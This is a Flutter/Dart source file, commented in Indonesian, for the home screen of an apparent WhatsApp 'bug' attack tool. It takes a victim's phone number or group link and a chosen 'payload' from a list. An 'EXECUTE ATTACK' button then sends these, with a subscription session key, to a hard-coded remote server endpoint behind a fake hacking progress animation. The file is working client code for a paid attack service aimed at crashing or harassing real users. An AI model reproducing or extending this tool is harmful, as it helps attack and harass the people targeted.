import 'dart:async'; // Diperlukan untuk Timer/Delay
import 'dart:convert';
import 'dart:ui'; // Diperlukan untuk efek blur (BackdropFilter)
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  // Controllers
  final TextEditingController targetController = TextEditingController();
  late VideoPlayerController _videoController;

  // --- Controller untuk Video Processing ---
  late VideoPlayerController _processingVideoController;

  // Animation Controllers
  late AnimationController _fadeController;
  late Animation<double> _fadeAnimation;

  // State Variables
  bool _isVideoInitialized = false;
  bool _isProcessingVideoInitialized = false;
  String selectedBugId = "";
  bool _isSending = false;

  // --- Variable untuk Trigger Overlay Processing ---
  bool _showProcessingOverlay = false;
   
  // --- Variable untuk Progress Bar (0-100) ---
  double _loadingProgress = 0.0;
  Timer? _progressTimer;

  // --- Variable untuk Mode Bug (Number / Group) ---
  bool _isGroupMode = false; // false = Number, true = Group

  // --- PALETTE WARNA GLASS ---
  final Color _glassBorder = Colors.white.withOpacity(0.3);
  final Color _glassBg = Colors.white.withOpacity(0.05); // Sangat transparan
  final Color _textWhite = Colors.white;
  final Color _textGrey = Colors.white54;

  @override
  void initState() {
    super.initState();

    // Init Animation
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    );
    _fadeAnimation = CurvedAnimation(parent: _fadeController, curve: Curves.easeIn);
    _fadeController.forward();

    // Set default selected bug
    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }

    // Init Video Background Utama
    _initializeVideoPlayer();

    // --- Init Video Processing ---
    _initializeProcessingVideo();
  }

  void _initializeVideoPlayer() {
    // URL Video Background
    _videoController = VideoPlayerController.networkUrl(
      Uri.parse('https://j.top4top.io/m_3678wxyts1.mp4'),
    )..initialize().then((_) {
        setState(() {
          _isVideoInitialized = true;
          _videoController.setVolume(1.0);
          _videoController.setLooping(true);
          _videoController.play();
        });
      }).catchError((error) {
        debugPrint("Error initializing main video: $error");
      });
  }

  // --- Fungsi Load Video Processing ---
  void _initializeProcessingVideo() {
    _processingVideoController = VideoPlayerController.networkUrl(
      Uri.parse('https://j.top4top.io/m_3678wxyts1.mp4'),
    )..initialize().then((_) {
        setState(() {
          _isProcessingVideoInitialized = true;
          _processingVideoController.setLooping(true);
        });
      }).catchError((error) {
        debugPrint("Error initializing processing video: $error");
      });
  }

  @override
  void dispose() {
    targetController.dispose();
    _videoController.dispose();
    _processingVideoController.dispose();
    _fadeController.dispose();
    _progressTimer?.cancel(); // Cancel timer progress
    super.dispose();
  }

  // --- LOGIC UTAMA: EXECUTE ATTACK (TANPA COIN) ---
  Future<void> _executeAttack() async {
    // 1. Validasi Input Awal
    final rawInput = targetController.text.trim();
    String? target;

    // Logic Validasi Format
    if (_isGroupMode) {
      if (rawInput.contains("chat.whatsapp.com")) {
        target = rawInput;
      } else {
        target = null;
      }
    } else {
      target = formatPhoneNumber(rawInput);
    }

    if (target == null) {
      _showNotification(
          "Invalid Input",
          _isGroupMode
              ? "Masukkan Link Group WhatsApp yang valid!"
              : "Gunakan format internasional (cth: +628xxx)",
          Colors.redAccent);
      return;
    }

    // 2. Mulai Proses Visual (Overlay & Loading)
    if (mounted) {
      setState(() {
        _isSending = true; // Kunci tombol
        _showProcessingOverlay = true; // Munculkan overlay hitam + video
        _processingVideoController.seekTo(Duration.zero);
        _processingVideoController.play();
        _loadingProgress = 0.0; // Reset progress bar
      });
       
      // Timer Logic untuk Progress Bar 0-100% dalam 5 detik
      _progressTimer?.cancel();
      _progressTimer = Timer.periodic(const Duration(milliseconds: 50), (timer) {
        if (mounted) {
          setState(() {
            if (_loadingProgress < 100) {
               _loadingProgress += 1;
            } else {
               _loadingProgress = 100;
               timer.cancel();
            }
          });
        } else {
          timer.cancel();
        }
      });
    }

    // 3. Beri jeda waktu (simulasi proses hacking) sesuai durasi video/animasi
    await Future.delayed(const Duration(seconds: 5));

    // 4. Panggil fungsi inti pengiriman bug (background)
    await _sendBug(target: target, skipLoadingSet: true);

    // 5. Selesai & Matikan Overlay
    if (mounted) {
      setState(() {
        _showProcessingOverlay = false;
        _processingVideoController.pause();
        _isSending = false;
        _loadingProgress = 0.0;
      });
      _progressTimer?.cancel();
    }
  }

  // --- LOGIC PENGIRIMAN BUG KE API ---
  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug({required String target, bool skipLoadingSet = false}) async {
    final key = widget.sessionKey;

    if (!skipLoadingSet) {
      setState(() {
        _isSending = true;
      });
    }

    try {
      final encodedTarget = Uri.encodeComponent(target);

      // Base URL API
      String url =
          "http://159.195.64.135:4000/sendBug?key=$key&target=$encodedTarget&bug=$selectedBugId&senderType=private";

      final res = await http.get(Uri.parse(url));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showNotification("⏳ Cooldown",
            "Harap tunggu beberapa saat sebelum mengirim lagi.", Colors.orange);
      } else if (data["valid"] == false) {
        _showNotification(
            "❌ Invalid Key", "Sesi Anda tidak valid atau berakhir.", Colors.red);
      } else if (data["sended"] == false) {
        _showNotification(
            "⚠️ Maintenance", "Server sedang dalam perbaikan.", Colors.redAccent);
      } else {
        String successMsg = _isGroupMode
            ? "Bug berhasil dikirim ke Group!"
            : "Bug berhasil dikirim ke $target!";

        _showNotification("✅ Success", successMsg, Colors.greenAccent);
        targetController.clear();
      }
    } catch (e) {
      _showNotification("❌ Error", "Gagal terhubung ke server.", Colors.red);
    }

    if (!skipLoadingSet) {
      setState(() => _isSending = false);
    }
  }

  void _showNotification(String title, String msg, Color color) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        content: ClipRRect(
          borderRadius: BorderRadius.circular(15),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
            child: Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.8),
                borderRadius: BorderRadius.circular(15),
                border: Border.all(color: color.withOpacity(0.8), width: 1.5),
              ),
              child: Row(
                children: [
                  Icon(
                    title.contains("Success")
                        ? Icons.check_circle
                        : Icons.info_outline,
                    color: color,
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(title,
                            style: TextStyle(
                                color: color,
                                fontWeight: FontWeight.bold,
                                fontSize: 16)),
                        Text(msg,
                            style: const TextStyle(
                                color: Colors.white70, fontSize: 12)),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
        duration: const Duration(seconds: 3),
      ),
    );
  }

  // --- UI BUILDER ---

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      resizeToAvoidBottomInset: false,
      body: Stack(
        children: [
          // 1. BACKGROUND VIDEO
          Positioned.fill(
            child: _isVideoInitialized
                ? FittedBox(
                    fit: BoxFit.cover,
                    child: SizedBox(
                      width: _videoController.value.size.width,
                      height: _videoController.value.size.height,
                      child: VideoPlayer(_videoController),
                    ),
                  )
                : Container(color: Colors.black),
          ),

          // 2. DARK OVERLAY
          Positioned.fill(
            child: Container(
              color: Colors.black
                  .withOpacity(0.6), // Slightly darker for readability
            ),
          ),

          // 3. MAIN CONTENT
          SafeArea(
            child: FadeTransition(
              opacity: _fadeAnimation,
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    // --- SECTION 1: HEADER (PROFILE & EXP) ---
                    Row(
                      children: [
                        // KIRI: User Profile
                        Expanded(
                          flex: 3,
                          child: _buildGlassCard(
                            padding: const EdgeInsets.all(12),
                            child: Row(
                              children: [
                                CircleAvatar(
                                  radius: 20,
                                  backgroundColor: Colors.white24,
                                  child: const Icon(Icons.person_outline,
                                      color: Colors.white),
                                ),
                                const SizedBox(width: 12),
                                Expanded(
                                  child: Column(
                                    crossAxisAlignment: CrossAxisAlignment.start,
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      Text(
                                        widget.username,
                                        style: TextStyle(
                                          color: _textWhite,
                                          fontWeight: FontWeight.bold,
                                          fontSize: 16,
                                        ),
                                        overflow: TextOverflow.ellipsis,
                                      ),
                                      const SizedBox(height: 2),
                                      Container(
                                        padding: const EdgeInsets.symmetric(
                                            horizontal: 6, vertical: 2),
                                        decoration: BoxDecoration(
                                          color: Colors.white.withOpacity(0.2),
                                          borderRadius: BorderRadius.circular(4),
                                        ),
                                        child: Text(
                                          widget.role.toUpperCase(),
                                          style: const TextStyle(
                                            color: Colors.white,
                                            fontSize: 10,
                                          ),
                                        ),
                                      )
                                    ],
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                        const SizedBox(width: 10),
                        // KANAN: Expired Date
                        Expanded(
                          flex: 2,
                          child: _buildGlassCard(
                            padding: const EdgeInsets.all(12),
                            child: Column(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                const Icon(Icons.calendar_month_outlined,
                                    size: 18, color: Colors.white),
                                const SizedBox(height: 4),
                                const Text("EXP",
                                    style: TextStyle(
                                        color: Colors.white54, fontSize: 8)),
                                Text(
                                  widget.expiredDate,
                                  style: TextStyle(
                                    color: _textWhite,
                                    fontWeight: FontWeight.bold,
                                    fontSize: 12,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ],
                    ),

                    const SizedBox(height: 15),

                    // --- SECTION 2: STEPS INDICATOR ---
                    _buildGlassCard(
                      padding: const EdgeInsets.symmetric(
                          vertical: 20, horizontal: 15),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.spaceAround,
                        children: [
                          _buildStepItem(Icons.edit_note, "Input", isActive: true),
                          Expanded(
                              child: Divider(
                                  color: _glassBorder,
                                  thickness: 1,
                                  endIndent: 5,
                                  indent: 5)),
                          _buildStepItem(Icons.settings_suggest, "Process",
                              isActive: false),
                          Expanded(
                              child: Divider(
                                  color: _glassBorder,
                                  thickness: 1,
                                  endIndent: 5,
                                  indent: 5)),
                          _buildStepItem(Icons.check_circle_outline, "Complete",
                              isActive: false),
                        ],
                      ),
                    ),

                    const SizedBox(height: 15),

                    // --- SECTION 3: TARGET INPUT (TERPISAH) ---
                    _buildGlassCard(
                      padding: const EdgeInsets.all(20),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          // Header Card: Switcher
                          Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: [
                              Text(
                                "TARGET",
                                style: TextStyle(
                                  color: _textGrey, 
                                  fontWeight: FontWeight.bold,
                                  fontSize: 12,
                                  letterSpacing: 1.5
                                ),
                              ),
                              GestureDetector(
                                onTap: () => setState(
                                    () => _isGroupMode = !_isGroupMode),
                                child: Container(
                                  padding: const EdgeInsets.symmetric(
                                      horizontal: 8, vertical: 4),
                                  decoration: BoxDecoration(
                                    color: Colors.white10,
                                    borderRadius: BorderRadius.circular(8),
                                    border: Border.all(color: Colors.white24),
                                  ),
                                  child: Row(
                                    children: [
                                      Icon(
                                          _isGroupMode
                                              ? Icons.groups
                                              : Icons.person,
                                          size: 12,
                                          color: Colors.white),
                                      const SizedBox(width: 4),
                                      Text(
                                        _isGroupMode
                                            ? "Group Mode"
                                            : "Number Mode",
                                        style: const TextStyle(
                                            color: Colors.white, fontSize: 10),
                                      ),
                                    ],
                                  ),
                                ),
                              ),
                            ],
                          ),
                           
                          const SizedBox(height: 15),

                          // Input Field
                          Container(
                            padding: const EdgeInsets.symmetric(
                                horizontal: 16, vertical: 4),
                            decoration: BoxDecoration(
                              color: Colors.transparent,
                              borderRadius: BorderRadius.circular(15),
                              border: Border.all(color: Colors.white38),
                            ),
                            child: Row(
                              children: [
                                Icon(
                                    _isGroupMode
                                        ? Icons.link
                                        : Icons.phone_in_talk,
                                    color: Colors.white38),
                                const SizedBox(width: 10),
                                Expanded(
                                  child: TextField(
                                    controller: targetController,
                                    style: const TextStyle(
                                        color: Colors.white, fontSize: 14),
                                    keyboardType: _isGroupMode
                                        ? TextInputType.url
                                        : TextInputType.phone,
                                    decoration: InputDecoration(
                                      hintText: _isGroupMode
                                          ? "https://chat.whatsapp..."
                                          : "e.g. +62xxxxxxxxxx",
                                      hintStyle: const TextStyle(
                                          color: Colors.white24),
                                      border: InputBorder.none,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(height: 8),
                          Text(
                            "Ensure the format is correct before executing.",
                            style: TextStyle(color: _textGrey, fontSize: 10),
                          ),
                        ],
                      ),
                    ),

                    const SizedBox(height: 15),

                    // --- SECTION 4: PAYLOAD/BUG SELECTOR (TERPISAH) ---
                    _buildGlassCard(
                      padding: const EdgeInsets.all(20),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            "PAYLOAD CONFIG",
                            style: TextStyle(
                                color: _textGrey, 
                                fontWeight: FontWeight.bold,
                                fontSize: 12,
                                letterSpacing: 1.5
                            ),
                          ),
                          const SizedBox(height: 10),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16),
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.05),
                              borderRadius: BorderRadius.circular(15),
                              border: Border.all(color: Colors.white12),
                            ),
                            child: DropdownButtonHideUnderline(
                              child: DropdownButton<String>(
                                value: selectedBugId,
                                dropdownColor: const Color(0xFF222222),
                                icon: const Icon(Icons.keyboard_arrow_down,
                                    color: Colors.white54),
                                isExpanded: true,
                                style: const TextStyle(
                                    color: Colors.white, fontSize: 14),
                                items: widget.listBug.map((bug) {
                                  return DropdownMenuItem<String>(
                                    value: bug['bug_id'],
                                    child: Text(bug['bug_name']),
                                  );
                                }).toList(),
                                onChanged: (val) {
                                  setState(() {
                                    selectedBugId = val!;
                                  });
                                },
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),

                    const Spacer(),

                    // --- SECTION 5: EXECUTE BUTTON (TERPISAH/BOTTOM) ---
                    GestureDetector(
                      onTap: _isSending ? null : _executeAttack,
                      child: _buildGlassCard(
                        padding: const EdgeInsets.all(0),
                        child: Container(
                          width: double.infinity,
                          height: 60,
                          decoration: BoxDecoration(
                             color: Colors.white.withOpacity(0.1), 
                             borderRadius: BorderRadius.circular(20),
                          ),
                          child: Center(
                            child: _isSending
                                ? const SizedBox(
                                    width: 25,
                                    height: 25,
                                    child: CircularProgressIndicator(
                                        color: Colors.white, strokeWidth: 2),
                                  )
                                : Row(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: const [
                                      Icon(Icons.bolt, color: Colors.yellowAccent),
                                      SizedBox(width: 8),
                                      Text(
                                        "EXECUTE ATTACK",
                                        style: TextStyle(
                                          color: Colors.white,
                                          fontWeight: FontWeight.bold,
                                          fontSize: 16,
                                          letterSpacing: 2,
                                        ),
                                      ),
                                    ],
                                  ),
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(height: 10),
                  ],
                ),
              ),
            ),
          ),

          // 4. --- PROCESSING OVERLAY (MODIFIED WITH PROGRESS) ---
          if (_showProcessingOverlay)
            Positioned.fill(
              child: Stack(
                children: [
                  BackdropFilter(
                    filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
                    child: Container(
                      color: Colors.black.withOpacity(0.9),
                    ),
                  ),
                  Center(
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        // Video Frame
                        _isProcessingVideoInitialized
                            ? ClipRRect(
                                borderRadius: BorderRadius.circular(20),
                                child: Container(
                                  decoration: BoxDecoration(
                                    border: Border.all(color: Colors.white30, width: 2),
                                    borderRadius: BorderRadius.circular(20),
                                    boxShadow: [
                                      BoxShadow(color: Colors.white.withOpacity(0.1), blurRadius: 20, spreadRadius: 5)
                                    ]
                                  ),
                                  width: MediaQuery.of(context).size.width * 0.8,
                                  height: 200,
                                  child: VideoPlayer(_processingVideoController),
                                ),
                              )
                            : const CircularProgressIndicator(color: Colors.white),
                         
                        const SizedBox(height: 30),

                        // --- PROGRESS BAR 0-100 ---
                        Text(
                          "PROSES SEND BUG ${_loadingProgress.toInt()}%",
                          style: const TextStyle(
                            color: Colors.white, 
                            fontFamily: "Courier", 
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1.5
                          ),
                        ),
                        const SizedBox(height: 10),
                        SizedBox(
                          width: MediaQuery.of(context).size.width * 0.7,
                          child: LinearProgressIndicator(
                            value: _loadingProgress / 100,
                            backgroundColor: Colors.white24,
                            valueColor: const AlwaysStoppedAnimation<Color>(Colors.greenAccent),
                            minHeight: 6,
                            borderRadius: BorderRadius.circular(10),
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }

  // --- CUSTOM GLASS CARD HELPER ---
  Widget _buildGlassCard(
      {required Widget child, EdgeInsetsGeometry? padding}) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(20),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: Container(
          width: double.infinity,
          padding: padding ?? const EdgeInsets.all(0),
          decoration: BoxDecoration(
            color: _glassBg,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: _glassBorder, width: 1),
          ),
          child: child,
        ),
      ),
    );
  }

  // --- STEP ITEM HELPER ---
  Widget _buildStepItem(IconData icon, String label, {bool isActive = false}) {
    return Column(
      children: [
        Container(
          padding: const EdgeInsets.all(8),
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            border: Border.all(
                color: isActive ? Colors.white : Colors.white24, width: 1.5),
            color: isActive ? Colors.white24 : Colors.transparent,
          ),
          child: Icon(icon,
              color: isActive ? Colors.white : Colors.white54, size: 18),
        ),
        const SizedBox(height: 6),
        Text(
          label,
          style: TextStyle(
            color: isActive ? Colors.white : Colors.white38,
            fontSize: 10,
          ),
        ),
      ],
    );
  }
}